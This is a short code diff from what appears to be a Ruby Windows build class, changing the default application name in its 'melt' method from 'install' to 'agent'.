@@ -104,7 +104,7 @@ class BuildWindows < Build
   def melt(params)
     trace :debug, "Build: melting: #{params}"
 
-    @appname = params['appname'] || 'install'
+    @appname = params['appname'] || 'agent'
     @cooked = false
 
     # overwrite the demo flag if the license doesn't allow it
